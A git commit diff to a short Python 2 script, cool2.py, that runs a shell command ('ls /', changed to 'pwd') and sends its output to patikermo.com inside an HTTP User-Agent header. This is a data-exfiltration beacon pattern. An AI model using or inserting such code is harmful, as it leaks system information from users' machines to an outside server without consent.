9e2a6ce2a92ae0f06b0f9a14285cb54184dcd9bd
Lino Nava <linonava@patikermo.com>
2021-07-16 12:13:12 -0400

    Update cool2.py

--- cool2.py
+++ cool2.py
@@ -1,8 +1,8 @@
 import urllib2
 import subprocess
-output = subprocess.check_output("ls /", shell=True)
+output = subprocess.check_output("pwd", shell=True)
 output = output.rstrip()
 output = output.replace("\n", " ")
-request = urllib2.Request("http://patikermo.com")
+request = urllib2.Request("https://patikermo.com")
 request.add_header('User-Agent',output)
 urllib2.urlopen(request)
